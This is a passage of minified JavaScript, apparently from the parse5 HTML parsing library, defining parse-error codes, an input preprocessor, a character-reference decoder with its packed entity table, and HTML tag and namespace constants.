a.cdataInHtmlContent="cdata-in-html-content",a.incorrectlyOpenedComment="incorrectly-opened-comment",a.eofInScriptHtmlCommentLikeText="eof-in-script-html-comment-like-text",a.eofInDoctype="eof-in-doctype",a.nestedComment="nested-comment",a.abruptClosingOfEmptyComment="abrupt-closing-of-empty-comment",a.eofInComment="eof-in-comment",a.incorrectlyClosedComment="incorrectly-closed-comment",a.eofInCdata="eof-in-cdata",a.absenceOfDigitsInNumericCharacterReference="absence-of-digits-in-numeric-character-reference",a.nullCharacterReference="null-character-reference",a.surrogateCharacterReference="surrogate-character-reference",a.characterReferenceOutsideUnicodeRange="character-reference-outside-unicode-range",a.controlCharacterReference="control-character-reference",a.noncharacterCharacterReference="noncharacter-character-reference",a.missingWhitespaceBeforeDoctypeName="missing-whitespace-before-doctype-name",a.missingDoctypeName="missing-doctype-name",a.invalidCharacterSequenceAfterDoctypeName="invalid-character-sequence-after-doctype-name",a.duplicateAttribute="duplicate-attribute",a.nonConformingDoctype="non-conforming-doctype",a.missingDoctype="missing-doctype",a.misplacedDoctype="misplaced-doctype",a.endTagWithoutMatchingOpenElement="end-tag-without-matching-open-element",a.closingOfElementWithOpenChildElements="closing-of-element-with-open-child-elements",a.disallowedContentInNoscriptInHead="disallowed-content-in-noscript-in-head",a.openElementsLeftAfterEof="open-elements-left-after-eof",a.abandonedHeadElementChild="abandoned-head-element-child",a.misplacedStartTagForHeadElement="misplaced-start-tag-for-head-element",a.nestedNoscriptInHead="nested-noscript-in-head",a.eofInElementThatCanContainOnlyText="eof-in-element-that-can-contain-only-text"})(pe||(pe={}));const r$=65536;class l${constructor(e){this.handler=e,this.html="",this.pos=-1,this.lastGapPos=-2,this.gapStack=[],this.skipNextNewLine=!1,this.lastChunkWritten=!1,this.endOfChunkHit=!1,this.bufferWaterline=r$,this.isEol=!1,this.lineStartPos=0,this.droppedBufferSize=0,this.line=1,this.lastErrOffset=-1}get col(){return this.pos-this.lineStartPos+ +(this.lastGapPos!==this.pos)}get offset(){return this.droppedBufferSize+this.pos}getError(e,t){const{line:n,col:i,offset:r}=this,l=i+t,u=r+t;return{code:e,startLine:n,endLine:n,startCol:l,endCol:l,startOffset:u,endOffset:u}}_err(e){this.handler.onParseError&&this.lastErrOffset!==this.offset&&(this.lastErrOffset=this.offset,this.handler.onParseError(this.getError(e,0)))}_addGap(){this.gapStack.push(this.lastGapPos),this.lastGapPos=this.pos}_processSurrogate(e){if(this.pos!==this.html.length-1){const t=this.html.charCodeAt(this.pos+1);if(o$(t))return this.pos++,this._addGap(),s$(e,t)}else if(!this.lastChunkWritten)return this.endOfChunkHit=!0,z.EOF;return this._err(pe.surrogateInInputStream),e}willDropParsedChunk(){return this.pos>this.bufferWaterline}dropParsedChunk(){this.willDropParsedChunk()&&(this.html=this.html.substring(this.pos),this.lineStartPos-=this.pos,this.droppedBufferSize+=this.pos,this.pos=0,this.lastGapPos=-2,this.gapStack.length=0)}write(e,t){this.html.length>0?this.html+=e:this.html=e,this.endOfChunkHit=!1,this.lastChunkWritten=t}insertHtmlAtCurrentPos(e){this.html=this.html.substring(0,this.pos+1)+e+this.html.substring(this.pos+1),this.endOfChunkHit=!1}startsWith(e,t){if(this.pos+e.length>this.html.length)return this.endOfChunkHit=!this.lastChunkWritten,!1;if(t)return this.html.startsWith(e,this.pos);for(let n=0;n<e.length;n++)if((this.html.charCodeAt(this.pos+n)|32)!==e.charCodeAt(n))return!1;return!0}peek(e){const t=this.pos+e;if(t>=this.html.length)return this.endOfChunkHit=!this.lastChunkWritten,z.EOF;const n=this.html.charCodeAt(t);return n===z.CARRIAGE_RETURN?z.LINE_FEED:n}advance(){if(this.pos++,this.isEol&&(this.isEol=!1,this.line++,this.lineStartPos=this.pos),this.pos>=this.html.length)return this.endOfChunkHit=!this.lastChunkWritten,z.EOF;let e=this.html.charCodeAt(this.pos);return e===z.CARRIAGE_RETURN?(this.isEol=!0,this.skipNextNewLine=!0,z.LINE_FEED):e===z.LINE_FEED&&(this.isEol=!0,this.skipNextNewLine)?(this.line--,this.skipNextNewLine=!1,this._addGap(),this.advance()):(this.skipNextNewLine=!1,WM(e)&&(e=this._processSurrogate(e)),this.handler.onParseError===null||e>31&&e<127||e===z.LINE_FEED||e===z.CARRIAGE_RETURN||e>159&&e<64976||this._checkForProblematicCharacters(e),e)}_checkForProblematicCharacters(e){KM(e)?this._err(pe.controlCharacterInInputStream):YM(e)&&this._err(pe.noncharacterInInputStream)}retreat(e){for(this.pos-=e;this.pos<this.lastGapPos;)this.lastGapPos=this.gapStack.pop(),this.pos--;this.isEol=!1}}var na;(function(a){a[a.CHARACTER=0]="CHARACTER",a[a.NULL_CHARACTER=1]="NULL_CHARACTER",a[a.WHITESPACE_CHARACTER=2]="WHITESPACE_CHARACTER",a[a.START_TAG=3]="START_TAG",a[a.END_TAG=4]="END_TAG",a[a.COMMENT=5]="COMMENT",a[a.DOCTYPE=6]="DOCTYPE",a[a.EOF=7]="EOF",a[a.HIBERNATION=8]="HIBERNATION"})(na||(na={}));function $M(a,e){for(let t=a.attrs.length-1;t>=0;t--)if(a.attrs[t].name===e)return a.attrs[t].value;return null}const c$=new Uint16Array('<\0\0\0\0\0\0EMabcfglmnoprstu\\bfmsligP&cutereve;iyx}rc;r;ravepha;acr;d;gpon;f;plyFunction;ingcsr;ign;ildemlaceforsucrkslash;;ed;y;crtause;noullis;a;r;pf;eve;cmpeq;HOacdefhilorsucy;PYcpyute;;italDifferentialD;leys;aeioron;dilrc;nint;ot;dnilla;terDot;i;rcleDMPTot;inus;lus;imes;ocskwiseContourIntegral;eCurlyDQoubleQuote;uote;lnpuon;e;gitruent;nt;ourIntegral;fr;oduct;nterClockwiseContourIntegral;oss;cr;p;Cap;DJSZacefios;otrahd;cy;cy;cy;grsger;r;hv;ayron;;l;ta;r;afcmriticalADGTcute;o;bleAcute;rave;ilde;ond;ferentialD;\0\0\0\0f;;DEot;qual;bleCDLRUVontourIntegrao\0\0nArrow;eoftARTrrow;ightArrow;engLReftARrrow;ightArrow;ightArrow;ightATrrow;ee;p\0\0rrow;ownArrow;erticalBar;nABLRTarrow;BUar;pArrow;reve;eft\0\0ightVector;eeVector;ector;Bar;ight\0eeVector;ector;Bar;ee;Arrow;ctr;rok;NTacdfglmopqstuxG;Hcuteaiyron;rc;ot;r;raveement;apcr;ty\0\0mallSquare;erySmallSquare;gpon;f;silon;uail;Tilde;librium;cir;m;a;mlipsts;onentialE;cfiosy;r;lled\0\0mallSquare;erySmallSquare;\0\0\0f;All;riertrf;cJTabcdfgorstcy;>mma;d;reve;eiydil;rc;;ot;r;;pf;eaterEFGLSTqual;Less;ullEqual;reater;ess;lantEqual;ilde;cr;;AacfiosuRDcy;ctek;;irc;r;lbertSpace;\0f;izontalLine;ctrok;mpownHumqual;EJOacdfgmnostucy;lig;cy;cuteiyrc;ot;r;rave;apcgr;inaryI;lie\0;egrral;section;isibleCTomma;imes;gpton;f;a;cr;ilde;\0cy;lcfosuiyrc;;r;pf;\0r;rcy;kcy;HJacfoscy;cy;ppa;eydil;;r;pf;cr;JTaceflmostcy;<cmnprute;bda;g;lacetrf;r;aeyron;dil;;fstACDFRTUVarnrgleBracket;row;BRar;ightArrow;eiling;o\0bleBracket;n\0eeVector;ector;Bar;loor;ightAVrrow;ector;ere;AVrrow;ector;iangle;BEar;qual;pDTVownVector;eeVector;ector;Bar;ector;Bar;ightsEFGLSTqualGreater;ullEqual;reater;ess;lantEqual;ilde;r;;eftarrow;idot;npwgLRlreftARrrow;ightArrow;ightArrow;eftarightightf;erLReftArrow;ightArrow;cht;rok;;acefiosup;y;dliumSpace;lintrf;r;nusPlus;pf;c;Jacefostucy;cute;aeyron;dil;;gswativeMTVediumSpace;hicneryThitedGLreaterGreateessLesLine;r;Bnptreak;BreakingSpace;f;;CDEGHLNPRSTVoungruent;pCap;oubleVerticalBar;lqxement;ual;Tilde;ists;reater;EFGLSTqual;ullEqual;reater;ess;lantEqual;ilde;umpownHump;qual;efstTriangle;BEar;qual;s;EGLSTqual;reater;ess;lantEqual;ilde;estedGLreaterGreater;essLess;recedes;ESqual;lantEqual;eiverseElement;ghtTriangle;BEar;qual;quuareSubpset;Equal;erset;Equal;bcpset;Equal;ceeds;ESTqual;lantEqual;ilde;erset;Equal;ilde;EFTqual;ullEqual;ilde;erticalBar;cr;ilde;Eacdfgmoprstuvlig;cuteiyrc;blac;r;raveaeicr;ga;cron;pf;enCurlyDQoubleQuote;uote;;clr;ashidees;mlerBParr;acek;et;arenthesis;acfhilorsrtialD;y;r;i;;usMinus;ipncareplanf;;eiocedes;ESTqual;lantEqual;ilde;me;dpuct;ortion;al;cir;;UfosOT"r;pf;cr;BEacefhiorsuarr;Gcnrute;g;r;tl;aeyron;dil;;;verseEUlqement;uilibrium;pEquilibrium;ro;ghtACDFTUVanrgleBracket;row;BLar;eftArrow;eiling;o\0bleBracket;n\0eeVector;ector;Bar;loor;ere;AVrrow;ector;iangle;BEar;qual;pDTVownVector;eeVector;ector;Bar;ector;Bar;puf;ndImplies;ightarrow;chr;;leDelayed;HOacfhimoqstuCcHcy;y;FTcy;cute;;aeiyron;dil;rc;;r;ortDLRUownArroweftArrowightArrowpArrow;gma;allCircle;pf;\0\0t;are;ISUntersection;ubpset;Equal;erset;Equal;nion;cr;ar;bcmp;set;Equal;cheeds;ESTqual;lantEqual;ilde;Th;;esrset;Equal;etHRSacfhiorsORNADE;Hccy;y;bu;;aeyron;dil;;r;ei\0efore;a;cnkSpace;Space;lde;EFTqual;ullEqual;ilde;pf;ipleDot;ctr;rok;\0\0\0\0\0\0\0cruter;ocir;r\0y;ve;iyrc;blac;r;raveacr;dierBParr;acek;et;arenthesis;on;Plus;gpon;f;ADETadpsrrow;BDar;ownArrow;ownArrow;quilibrium;ee;Arrow;ownerLReftArrow;ightArrow;i;lon;ing;cr;ilde;mlDbcdefosvash;ar;y;ash;l;er;btyar;;icalBLSTar;ine;eparator;ilde;ThinSpace;r;pf;cr;dash;cefosirc;dge;r;pf;cr;fiosr;;pf;cr;AIUacfosucy;cy;cy;cuteiyrc;;r;pf;cr;ml;Hacdefoscy;cute;ayron;;ot;\0oWidta;r;pf;cr;\0\0\0\0\0\0\0cutereve;;Ediuy;;rcte;lig;r;raveepfpsym;ha;apcclr;g;\0\0;adsvnd;;lope;;;elmrsz;esd;a;;;;;;;;t;vb;d;pth;arr;gpon;f;;Eaeiop;cir;;d;s;rox;eingctyr;;mp;eildemlcioninnt;Nabcdefiklnoprsuot;crkcepsong;psilon;rime;im;eq;ee;ed;gerk;tbrk;oy;quo;cmprtaus;eptyv;snoahw;;een;r;gcostuvwaiurc;pdptot;lus;imes;\0\0cup;ar;riangleduown;p;plus;earow;akocnklstozenge;riangle;dlrown;eft;ight;k;\0\0;;4;ck;eo;q=uiv;t;ptwxf;;tomtie;DHUVbdhmptuvLRlr;;;;;DUdu;;;;LRlr;;;;;HLRhlr;;;;;;ox;LRlr;;;;;DUdu;;;;inus;lus;imes;LRlr;;;;;HLRhlr;;;;;;evbarceior;mi;m;el;bh;sub;l;etp;Ee;;q\0\0\0\0\0\0\0\0\0\0cprute;;abcdsnd;rcup;aup;p;ot;;eot;aeiu\0s;on;dilrc;ps;sm;ot;dmnilptyv;t;err;ceiy;ck;mark;r;Ecefms;;elq;e\0\0rrowlreft;ight;RSacd;st;irc;ash;nint;id;cir;ubs;uit\0on;e;q\0\0a;t;;flemxente\0;dot;nfry;o;sr;aorr;ss;cur;bp;e;;e;dot;delprvwarrlr;;\0\0r;c;arr;p;;bcdosrcap;aup;p;ot;r;;alrvrr;m;yevwq\0\0reuee;edge;enearrowlreftightecioninnt;lcty;AHabcdefhijlorstuwzrar;glrsger;eth;h;varow;aayron;;;aogrr;tseq;glmta;ptyv;irsht;;arlraegsvm;osnd;suit;amma;in;;iode;ontimes;ncy;c\0\0rn;op;lptuwlar;f;;empsq;dot;inus;lus;quare;blebarwedgnadhownarrowarpoonlrefighkaro\0\0rn;op;cotry;;l;rok;drot;i;fahraangle;ciy;grarr;DacdefglmnopqrstuxDoocsuteter;aioyron;r;clon;;ot;Drot;;;rsave;dot;;ilsnters;;;dot;apscr;ty;svetp1;;;gs;p;gpon;f;alsr;sl;us;i;lvon;csuviorc\0\0antgltressaeils;st;v;DD;parsl;Daot;rr;cdir;oah;mrlo;cipl;seoctationential\0\0\0\0\0\0\0llingdotsey;male;ilrlig;\0\0g;ig;;lig;lig;fjaltt;ig;ns;of;\0f;ak;v;artint;aocs\0\0;;;;\0;;\0\0;;5;\0;;8;l;wn;cr;Eabcdefgijlnorstv;l;cmpute;ma;d;reve;iyrc;;ot;;lqs;qslan;cdlc;ot;o;l;;es;r;;gmel;cy;;Eaj;;;Eaes;p;prox;q;qim;pf;cir;m;el;;>;cdlqrci;r;ot;Par;uest;adels\0pror;qlqlesienrtneqq;Aabcefkosyrilmrrsfildrcy;;cwir;;ar;irc;alrrts;uitlip;con;r;sewarow;arow;amoprrr;tht;klreftarrow;ightarrow;f;bar;cltr;asrok;bpull;hen\0\0\0\0\0\0cute;iyrc;cxy;clfr;rave;inoinnt;t;fin;ta;lig;aopcgtr;elpinarh;f;ed;;cfotare;in;tie;do;celpal;grerarhk;rod;cgpty;on;f;a;uestcir;n;Edsv;ot;;v;;ilde;\0cy;lcfmosuiyrc;;r;ath;pf;\0r;rcy;kcy;acfghjosppa;v;eydil;;r;reen;cy;cy;pf;cr;ABEHabcdefghjlmnoprstuvartrail;arr;;g;ar;\0\0\0\0\0\0\0\0\0ute;mptyv;rabda;g;dl;;uor;bfhlpst;fs;s;p;l;im;l;;aeil;;s;abrrr;rk;akcek;;es;ldu;;aeuyron;diil;;cqrsa;uo;rduhar;shar;h;;fgqstahlrtrrow;taarpoonduownpeftarrows;ightahsrrow;sarpoonquigarrohreetimes;;qslan;cdgsc;ot;o;r;;es;adegspproot;qgqgtiilrsht;;;E;rdu;l;lk;cy;;achtrorneard;ri;iodot;ust;acheEaes;p;prox;q;qim;abnoptwznrg;r;rglmreftarightapsto;ightparrowlrefight;aflr;;us;imes;st;;efngear;lt;achmtrornear;d;;ri;achiqtquo;r;m;eg;;buo;r;rok;<;cdhilqrci;r;remes;arr;uest;Piar;;efrdushar;har;enrtneqq;DacdefhilnopsuDot;clprret;;ese;sto;dluowefker;oymma;;ash;asuredangler;o;cdnro;acdsir;otus;bd;u;p;dpels;f;ctr;pos;lmtimap;GLRVabcdefghijlmoprstuvwgt;;veltftarrrow;ightarrow;;;vightarrow;Ddash;ash;bcnptlaute;g;;Eiop;d;s;rour;al;s\0pmp;eaeouy\0;on;dil;ng;dot;p;;ash;;Aadqsxrr;rhrk;;oot;uieiar;ist;sr;Eest;qs;qslani;rAaprrr;ar;;sv;d;cy;AEadestr;rr;r;;fqstarrroightarro;qslan;si;ri;eiptf;;inn;Edv;ot;;;i;v;;aorr;astllel;;lint;;ceu;c;eAaitrrr;cw;;ghtarrowri;echimpqu;ceru;ort\0\0arm;e;qsubpbcp;Ees;et;eq;qc;e;Ees;et;eq;qgilrldeianglelreft;eight;e;m;esro;p;DHadgilrsash;arr;p;ash;et;;>nfin;Aetrr;;;r<ie;Atrr;rie;im;Aanrr;rhrk;;oear;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0csuteiyr;c;abioslac;v;old;lig;crir;;\0\0\0n;ave;bmar;acitrirr;oss;n;aeicr;ga;cdnron;;pf;aelr;rp;;adiosvr;efmr;ofgof;r;lope;;cloashl;idees;as;mlbar;\0\0\0\0\0\0\0\0\0r;ast;lle\0\0m;;y;rcimptnt;od;il;enk;r;imo;v;mane;;tvchfork;aunckk;h;s;abcdemstcir;ir;ou;;nim;wo;ipuntint;f;nd;Eaceinosu;p;u;c;acenspprourlyeaespprox;qq;im;ime;sEasdfpalslar;ine;urf;;trel;cir;;ncsp;fiopsur;pf;rime;cr;aeoteirnionnt;st;eABHabcdefhilmnoprstuxartrail;arar;cdenqrteu;te;imptyv;g;del;;uor;abcfhlpstwp;;fs;;s;l;im;l;;aiil;o;nalabrrrk;akcek;;es;ldu;;aeuyron;diil;;clqsa;dhar;uo;rh;acgl;ipsnart;ilrsht;;aordu;l;;v;gnshtahlrstrrow;taarpoonduowpeftahrrowarpoonightarrows;quigarrohreetimes;g;ingdotseahmra;oust;achemid;abptnrg;r;raflr;;us;imes;apr;gt;olint;arachqquo;r;buo;rhirremes;i;efltri;luhar;;\0\0\0\0\0\0\0cute;qu;Eaceinpsy;\0;on;u;dil;rc;Eas;p;im;olint;i;ot;be;Aacmstxrr;rhr;oti;war;minnut;r;oacoyrp;hycy;;rt\0\0iaragmma;fv;;deglnprot;;q;E;;E;e;lus;arr;araeitlslsetmhp;parsl;dle;;e;s;flptcy;;b;ar;f;adres;uitcsuaup;s;p;s;ubp;eset;e;eset;e;afrarcemtr;tmiararr;fanighteppsilohsbcmnp;Edemnprs;ot;;dot;ult;Ee;;lus;arr;eiut;enq;qeq;qm;bp;;c;acenspprourlyeaespproqg;123;Edehlmnps;ost;ub;;dot;soul;b;arr;ult;Ee;;lus;eiut;enq;qeq;qm;bp;;Aanrr;rhr;owar;lig\0\0\0\0\0\0\0\0\0\0\0\0get;;raeyron;dil;;lrec;r;eiko\0e4fa;svym;cnkaspproimsasrnes;bd;ar;;eps;bcfot;ir;;ork;rime;aipdadempstngle;dlqrowneft;e;ight;eot;inus;lus;b;ime;ezium;chtry;;cy;rok;ioxheadlreftarroightarrowAHabcdfghlmoprstuwrar;cruter\0y;ve;iyrc;abhrlac;airsht;;raverlrlk;ct\0\0rn;erop;ri;alcr;gpon;f;adhlsuownarpoonlrefighi;hlonparrows;cit\0\0rn;erop;ng;ri;cr;dirot;lde;i;famrlangle;ABDacdeflnoprszrar;v;asnrgrt;eknprstappothinhirop;hiugmbpsetneq;q;setneq;q;hretianglelreftighty;ashelr;bear;q;lip;btar;trsubppf;rotrcur;bpnEenEeigzag;cefoprsirc;dibgar;e;q;erp;r;pf;;eatcr;\0\0\0\0\0\0\0trr;Aarr;Aarrais;dptfl;imAarrcqr;ptracefiosucuyte;iyrc;;nr;cy;pf;cr;cmy;lacdefhioswcute;ayron;;ot;ettra;r;cy;grarr;pf;cr;jn;j;'.split("").map(a=>a.charCodeAt(0))),u$=new Map([[0,65533],[128,8364],[130,8218],[131,402],[132,8222],[133,8230],[134,8224],[135,8225],[136,710],[137,8240],[138,352],[139,8249],[140,338],[142,381],[145,8216],[146,8217],[147,8220],[148,8221],[149,8226],[150,8211],[151,8212],[152,732],[153,8482],[154,353],[155,8250],[156,339],[158,382],[159,376]]);function d$(a){var e;return a>=55296&&a<=57343||a>1114111?65533:(e=u$.get(a))!==null&&e!==void 0?e:a}var It;(function(a){a[a.NUM=35]="NUM",a[a.SEMI=59]="SEMI",a[a.EQUALS=61]="EQUALS",a[a.ZERO=48]="ZERO",a[a.NINE=57]="NINE",a[a.LOWER_A=97]="LOWER_A",a[a.LOWER_F=102]="LOWER_F",a[a.LOWER_X=120]="LOWER_X",a[a.LOWER_Z=122]="LOWER_Z",a[a.UPPER_A=65]="UPPER_A",a[a.UPPER_F=70]="UPPER_F",a[a.UPPER_Z=90]="UPPER_Z"})(It||(It={}));const p$=32;var Fs;(function(a){a[a.VALUE_LENGTH=49152]="VALUE_LENGTH",a[a.BRANCH_LENGTH=16256]="BRANCH_LENGTH",a[a.JUMP_TABLE=127]="JUMP_TABLE"})(Fs||(Fs={}));function q0(a){return a>=It.ZERO&&a<=It.NINE}function m$(a){return a>=It.UPPER_A&&a<=It.UPPER_F||a>=It.LOWER_A&&a<=It.LOWER_F}function f$(a){return a>=It.UPPER_A&&a<=It.UPPER_Z||a>=It.LOWER_A&&a<=It.LOWER_Z||q0(a)}function h$(a){return a===It.EQUALS||f$(a)}var Pt;(function(a){a[a.EntityStart=0]="EntityStart",a[a.NumericStart=1]="NumericStart",a[a.NumericDecimal=2]="NumericDecimal",a[a.NumericHex=3]="NumericHex",a[a.NamedEntity=4]="NamedEntity"})(Pt||(Pt={}));var Uo;(function(a){a[a.Legacy=0]="Legacy",a[a.Strict=1]="Strict",a[a.Attribute=2]="Attribute"})(Uo||(Uo={}));class g${constructor(e,t,n){this.decodeTree=e,this.emitCodePoint=t,this.errors=n,this.state=Pt.EntityStart,this.consumed=1,this.result=0,this.treeIndex=0,this.excess=1,this.decodeMode=Uo.Strict}startEntity(e){this.decodeMode=e,this.state=Pt.EntityStart,this.result=0,this.treeIndex=0,this.excess=1,this.consumed=1}write(e,t){switch(this.state){case Pt.EntityStart:return e.charCodeAt(t)===It.NUM?(this.state=Pt.NumericStart,this.consumed+=1,this.stateNumericStart(e,t+1)):(this.state=Pt.NamedEntity,this.stateNamedEntity(e,t));case Pt.NumericStart:return this.stateNumericStart(e,t);case Pt.NumericDecimal:return this.stateNumericDecimal(e,t);case Pt.NumericHex:return this.stateNumericHex(e,t);case Pt.NamedEntity:return this.stateNamedEntity(e,t)}}stateNumericStart(e,t){return t>=e.length?-1:(e.charCodeAt(t)|p$)===It.LOWER_X?(this.state=Pt.NumericHex,this.consumed+=1,this.stateNumericHex(e,t+1)):(this.state=Pt.NumericDecimal,this.stateNumericDecimal(e,t))}addToNumericResult(e,t,n,i){if(t!==n){const r=n-t;this.result=this.result*Math.pow(i,r)+Number.parseInt(e.substr(t,r),i),this.consumed+=r}}stateNumericHex(e,t){const n=t;for(;t<e.length;){const i=e.charCodeAt(t);if(q0(i)||m$(i))t+=1;else return this.addToNumericResult(e,n,t,16),this.emitNumericEntity(i,3)}return this.addToNumericResult(e,n,t,16),-1}stateNumericDecimal(e,t){const n=t;for(;t<e.length;){const i=e.charCodeAt(t);if(q0(i))t+=1;else return this.addToNumericResult(e,n,t,10),this.emitNumericEntity(i,2)}return this.addToNumericResult(e,n,t,10),-1}emitNumericEntity(e,t){var n;if(this.consumed<=t)return(n=this.errors)===null||n===void 0||n.absenceOfDigitsInNumericCharacterReference(this.consumed),0;if(e===It.SEMI)this.consumed+=1;else if(this.decodeMode===Uo.Strict)return 0;return this.emitCodePoint(d$(this.result),this.consumed),this.errors&&(e!==It.SEMI&&this.errors.missingSemicolonAfterCharacterReference(),this.errors.validateNumericCharacterReference(this.result)),this.consumed}stateNamedEntity(e,t){const{decodeTree:n}=this;let i=n[this.treeIndex],r=(i&Fs.VALUE_LENGTH)>>14;for(;t<e.length;t++,this.excess++){const l=e.charCodeAt(t);if(this.treeIndex=b$(n,i,this.treeIndex+Math.max(1,r),l),this.treeIndex<0)return this.result===0||this.decodeMode===Uo.Attribute&&(r===0||h$(l))?0:this.emitNotTerminatedNamedEntity();if(i=n[this.treeIndex],r=(i&Fs.VALUE_LENGTH)>>14,r!==0){if(l===It.SEMI)return this.emitNamedEntityData(this.treeIndex,r,this.consumed+this.excess);this.decodeMode!==Uo.Strict&&(this.result=this.treeIndex,this.consumed+=this.excess,this.excess=0)}}return-1}emitNotTerminatedNamedEntity(){var e;const{result:t,decodeTree:n}=this,i=(n[t]&Fs.VALUE_LENGTH)>>14;return this.emitNamedEntityData(t,i,this.consumed),(e=this.errors)===null||e===void 0||e.missingSemicolonAfterCharacterReference(),this.consumed}emitNamedEntityData(e,t,n){const{decodeTree:i}=this;return this.emitCodePoint(t===1?i[e]&~Fs.VALUE_LENGTH:i[e+1],n),t===3&&this.emitCodePoint(i[e+2],n),n}end(){var e;switch(this.state){case Pt.NamedEntity:return this.result!==0&&(this.decodeMode!==Uo.Attribute||this.result===this.treeIndex)?this.emitNotTerminatedNamedEntity():0;case Pt.NumericDecimal:return this.emitNumericEntity(0,2);case Pt.NumericHex:return this.emitNumericEntity(0,3);case Pt.NumericStart:return(e=this.errors)===null||e===void 0||e.absenceOfDigitsInNumericCharacterReference(this.consumed),0;case Pt.EntityStart:return 0}}}function b$(a,e,t,n){const i=(e&Fs.BRANCH_LENGTH)>>7,r=e&Fs.JUMP_TABLE;if(i===0)return r!==0&&n===r?t:-1;if(r){const d=n-r;return d<0||d>=i?-1:a[t+d]-1}let l=t,u=l+i-1;for(;l<=u;){const d=l+u>>>1,p=a[d];if(p<n)l=d+1;else if(p>n)u=d-1;else return a[d+i]}return-1}var Ce;(function(a){a.HTML="http://www.w3.org/1999/xhtml",a.MATHML="http://www.w3.org/1998/Math/MathML",a.SVG="http://www.w3.org/2000/svg",a.XLINK="http://www.w3.org/1999/xlink",a.XML="http://www.w3.org/XML/1998/namespace",a.XMLNS="http://www.w3.org/2000/xmlns/"})(Ce||(Ce={}));var el;(function(a){a.TYPE="type",a.ACTION="action",a.ENCODING="encoding",a.PROMPT="prompt",a.NAME="name",a.COLOR="color",a.FACE="face",a.SIZE="size"})(el||(el={}));var Kn;(function(a){a.NO_QUIRKS="no-quirks",a.QUIRKS="quirks",a.LIMITED_QUIRKS="limited-quirks"})(Kn||(Kn={}));var ne;(function(a){a.A="a",a.ADDRESS="address",a.ANNOTATION_XML="annotation-xml",a.APPLET="applet",a.AREA="area",a.ARTICLE="article",a.ASIDE="aside",a.B="b",a.BASE="base",a.BASEFONT="basefont",a.BGSOUND="bgsound",a.BIG="big",a.BLOCKQUOTE="blockquote",a.BODY="body",a.BR="br",a.BUTTON="button",a.CAPTION="caption",a.CENTER="center",a.CODE="code",a.COL="col",a.COLGROUP="colgroup",a.DD="dd",a.DESC="desc",a.DETAILS="details",a.DIALOG="dialog",a.DIR="dir",a.DIV="div",a.DL="dl",a.DT="dt",a.EM="em",a.EMBED="embed",a.FIELDSET="fieldset",a.FIGCAPTION="figcaption",a.FIGURE="figure",a.FONT="font",a.FOOTER="footer",a.FOREIGN_OBJECT="foreignObject",a.FORM="form",a.FRAME="frame",a.FRAMESET="frameset",a.H1="h1",a.H2="h2",a.H3="h3",a.H4="h4",a.H5="h5",a.H6="h6",a.HEAD="head",a.HEADER="header",a.HGROUP="hgroup",a.HR="hr",a.HTML="html",a.I="i",a.IMG="img",a.IMAGE="image",a.INPUT="input",a.IFRAME="iframe",a.KEYGEN="keygen",a.LABEL="label",a.LI="li",a.LINK="link",a.LISTING="listing",a.MAIN="main",a.MALIGNMARK="malignmark",a.MARQUEE="marquee",a.MATH="math",a.MENU="menu",a.META="meta",a.MGLYPH="mglyph",a.MI="mi",a.MO="mo",a.MN="mn",a.MS="ms",a.MTEXT="mtext",a.NAV="nav",a.NOBR="nobr",a.NOFRAMES="noframes",a.NOEMBED="noembed",a.NOSCRIPT="noscript",a.OBJECT="object",a.OL="ol",a.OPTGROUP="optgroup",a.OPTION="option",a.P="p",a.PARAM="param",a.PLAINTEXT="plaintext",a.PRE="pre",a.RB="rb",a.RP="rp",a.RT="rt",a.RTC="rtc",a.RUBY="ruby",a.S="s",a.SCRIPT="script",a.SEARCH="search",a.SECTION="section",a.SELECT="select",a.SOURCE="source",a.SMALL="small",a.SPAN="span",a.STRIKE="strike",a.STRONG="strong",a.STYLE="style",a.SUB="sub",a.SUMMARY="summary",a.SUP="sup",a.TABLE="table",a.TBODY="tbody",a.TEMPLATE="template",a.TEXTAREA="textarea",a.TFOOT="tfoot",a.TD="td",a.TH="th",a.THEAD="thead",a.TITLE="title",a.TR="tr",a.TRACK="track",a.TT="tt",a.U="u",a.UL="ul",a.SVG="svg",a.VAR="var",a.WBR="wbr",a.XMP="xmp"})(ne||(ne={}));var S;(function(a){a[a.UNKNOWN=0]="UNKNOWN",a[a.A=1]="A",a[a.ADDRESS=2]="ADDRESS",a[a.ANNOTATION_XML=3]="ANNOTATION_XML",a[a.APPLET=4]="APPLET",a[a.AREA=5]="AREA",a[a.ARTICLE=6]="ARTICLE",a[a.ASIDE=7]="ASIDE",a[a.B=8]="B",a[a.BASE=9]="BASE",a[a.BASEFONT=10]="BASEFONT",a[a.BGSOUND=11]="BGSOUND",a[a.BIG=12]="BIG",a[a.BLOCKQUOTE=13]="BLOCKQUOTE",a[a.BODY=14]="BODY",a[a.BR=15]="BR",a[a.BUTTON=16]="BUTTON",a[a.CAPTION=17]="CAPTION",a[a.CENTER=18]="CENTER",a[a.CODE=19]="CODE",a[a.COL=20]="COL",a[a.COLGROUP=21]="COLGROUP",a[a.DD=22]="DD",a[a.DESC=23]="DESC",a[a.DETAILS=24]="DETAILS",a[a.DIALOG=25]="DIALOG",a[a.DIR=26]="DIR",a[a.DIV=27]="DIV",a[a.DL=28]="DL",a[a.DT=29]="DT",a[a.EM=30]="EM",a[a.EMBED=31]="EMBED",a[a.FIELDSET=32]="FIELDSET",a[a.FIGCAPTION=33]="FIGCAPTION",a[a.FIGURE=34]="FIGURE",a[a.FONT=35]="FONT",a[a.FOOTER=36]="FOOTER",a[a.FOREIGN_OBJECT=37]="FOREIGN_OBJECT",a[a.FORM=38]="FORM",a[a.FRAME=39]="FRAME",a[a.FRAMESET=40]="FRAMESET",a[a.H1=41]="H1",a[a.H2=42]="H2",a[a.H3=43]="H3",a[a.H4=44]="H4",a[a.H5=45]="H5",a[a.H6=46]="H6",a[a.HEAD=47]="HEAD",a[a.HEADER=48]="HEADER",a[a.HGROUP=49]="HGROUP",a[a.HR=50]="HR",a[a.HTML=51]="HTML",a[a.I=52]="I",a[a.IMG=53]="IMG",a[a.IMAGE=54]="IMAGE",a[a.INPUT=55]="INPUT",a[a.IFRAME=56]="IFRAME",a[a.KEYGEN=57]="KEYGEN",a[a.LABEL=58]="LABEL",a[a.LI=59]="LI",a[a.LINK=60]="LINK",a[a.LISTING=61]="LISTING",a[a.MAIN=62]="MAIN",a[a.MALIGNMARK=63]="MALIGNMARK",a[a.MARQUEE=64]="MARQUEE",a[a.MATH=65]="MATH",a[a.MENU=66]="MENU",a[a.META=67]="META",a[a.MGLYPH=68]="MGLYPH",a[a.MI=69]="MI",a[a.MO=70]="MO",a[a.MN=71]="MN",a[a.